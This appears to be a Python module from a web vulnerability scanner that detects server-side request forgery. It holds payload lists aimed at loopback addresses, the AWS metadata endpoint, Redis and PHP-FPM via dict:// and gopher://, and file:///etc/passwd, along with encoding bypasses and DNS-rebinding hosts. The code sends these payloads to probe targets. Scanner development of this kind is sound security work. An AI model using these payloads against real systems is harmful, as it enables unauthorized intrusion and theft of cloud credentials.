"""Server-Side Request Forgery (SSRF) detection (enhanced)."""

from web_scanner.scanner import BaseScanner

# Core SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://[::1]",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "dict://127.0.0.1:6379/",  # Redis
    "gopher://127.0.0.1:9000/",  # PHP-FPM
    "file:///etc/passwd",
]

# URL-encoding and IP-format bypass payloads (no overlap with SSRF_PAYLOADS)
SSRF_BYPASS_PAYLOADS = [
    # Encoded localhost variants
    "http://0177.0.0.1",            # octal
    "http://2130706433",            # decimal IP
    "http://0x7f000001",            # hex IP
    "http://127.1",                 # short notation
    "http://0x7f.0.0.0x1",          # mixed hex/decimal
    # Double-encoded
    "http%3a%2f%2f127.0.0.1",
    "http%253a%252f%252f127.0.0.1",  # double-encoded
    # IPv6 variants
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    # Bypass with credentials / subdomain
    "http://127.0.0.1%0d%0aFoo:bar",
    "http://127.0.0.1#evil.com",
    "http://127.0.0.1@evil.com",
    "http://evil.com@127.0.0.1",
]

# DNS rebinding via public DNS services
DNS_REBINDING_PAYLOADS = [
    "http://127.0.0.1.nip.io",
    "http://127.0.0.1.sslip.io",
    "http://localtest.me",
    "http://localhost.nip.io",
]

SSRF_PARAMS = [
    "url", "uri", "link", "path", "dest", "next", "data",
    "domain", "page", "feed", "file", "target", "proxy",
    "proxyurl", "fetch_url", "image_url", "avatar_url",
    "source", "callback", "api", "host", "redirect",
    "load_url", "file_url", "download", "open", "view",
]

SSRF_INDICATORS = [
    "root:x:0:", "aws", "accesskeyid", "iam",
    "ami-id", "instance-id", "reservation-id",
    "internal error", "connection refused",
    "localhost", "127.0.0.1", "169.254.169.254",
]


class SSRFScanner(BaseScanner):
    """Detect SSRF via out-of-band indicators, URL encoding bypasses, and
    DNS rebinding vectors."""

    def run(self) -> list[dict]:
        findings: list[dict] = []

        # Discover param names from forms
        found_params = self._discover_params()
        if not found_params:
            found_params = set(SSRF_PARAMS[:3])  # fallback

        all_payloads = list(SSRF_PAYLOADS) + list(SSRF_BYPASS_PAYLOADS)

        for param in found_params:
            for payload in all_payloads:
                import urllib.parse
                # Send raw (some servers decode automatically)
                resp = self.client.get(f"?{param}={payload}")
                if resp is None:
                    continue

                body_lower = resp.text.lower()

                # Check for SSRF indicators
                if self._has_ssrf_indicators(body_lower):
                    findings.append({
                        "severity": "HIGH",
                        "title": f"Possible SSRF via '{param}' (payload: {payload[:40]})",
                        "detail": f"URL: {self._full_url(f'?{param}={payload[:60]}')}\nInternal data leaked for payload",
                    })
                    break

                # Time-based: very long response for loopback payloads
                if resp.elapsed.total_seconds() > 10 and "127.0.0.1" in payload:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": f"Possible SSRF via '{param}' (time-based)",
                        "detail": f"URL: {self._full_url(f'?{param}={payload[:60]}')}\nLong delay suggesting internal service access",
                    })
                    break

            # DNS rebinding check
            findings += self._check_dns_rebinding(param)

            # Check for image-upload / fetch endpoints with url= param
            findings += self._check_image_fetch_endpoint(param)

            # Redirect-based SSRF bypass
            findings += self._check_redirect_bypass(param)

        return findings

    # -- DNS rebinding -----------------------------------------------------

    def _check_dns_rebinding(self, param: str) -> list[dict]:
        findings: list[dict] = []
        for payload in DNS_REBINDING_PAYLOADS:
            resp = self.client.get(f"?{param}={payload}", allow_redirects=True)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            if self._has_ssrf_indicators(body_lower):
                findings.append({
                    "severity": "HIGH",
                    "title": (
                        f"Possible SSRF via DNS rebinding — param '{param}'"
                    ),
                    "detail": (
                        f"Domain {payload} resolved to internal resource"
                    ),
                })
                break
        return findings

    # -- Redirect-based bypass (attacker-host -> 127.0.0.1) ----------------

    def _check_redirect_bypass(self, param: str) -> list[dict]:
        findings: list[dict] = []
        redirect_chain_payloads = [
            "http://127.0.0.1",
            "http://127.0.0.1.nip.io",
        ]
        for payload in redirect_chain_payloads:
            resp = self.client.get(f"?{param}={payload}", allow_redirects=True)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            if self._has_ssrf_indicators(body_lower):
                findings.append({
                    "severity": "HIGH",
                    "title": (
                        f"Possible SSRF via redirect chain — param '{param}'"
                    ),
                    "detail": (
                        f"Redirect to {payload} leaked internal data"
                    ),
                })
                break
        return findings

    # -- Image upload / fetch endpoints ------------------------------------

    def _check_image_fetch_endpoint(self, param: str) -> list[dict]:
        findings: list[dict] = []
        image_fetch_paths = [
            "upload", "avatar", "image", "fetch", "proxy",
            "import", "download", "preview", "thumbnail",
        ]
        for ep in image_fetch_paths:
            payload = "http://169.254.169.254/latest/meta-data/"
            resp = self.client.get(f"/{ep}?{param}={payload}")
            if resp is None:
                continue
            body_lower = resp.text.lower()
            if self._has_ssrf_indicators(body_lower):
                findings.append({
                    "severity": "HIGH",
                    "title": (
                        f"SSRF on /{ep} endpoint via '{param}'"
                    ),
                    "detail": (
                        f"Image/fetch endpoint /{ep} with param '{param}' "
                        f"is vulnerable to SSRF"
                    ),
                })
                break
        return findings

    # -- helpers -----------------------------------------------------------

    def _has_ssrf_indicators(self, body_lower: str) -> bool:
        return any(ind in body_lower for ind in SSRF_INDICATORS)

    def _discover_params(self) -> set[str]:
        found_params: set[str] = set()
        try:
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse, parse_qs
            resp = self.client.get("/")
            if resp is None:
                return found_params
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                for inp in form.find_all(["input", "select"]):
                    name = inp.get("name", "")
                    for p in SSRF_PARAMS:
                        if p.lower() in name.lower():
                            found_params.add(name)
            for tag in soup.find_all(True, href=True):
                href = tag.get("href", "")
                if "?" in href:
                    for p in parse_qs(urlparse(href).query):
                        for pp in SSRF_PARAMS:
                            if p.lower() == pp.lower():
                                found_params.add(p)
        except Exception:
            pass
        return found_params
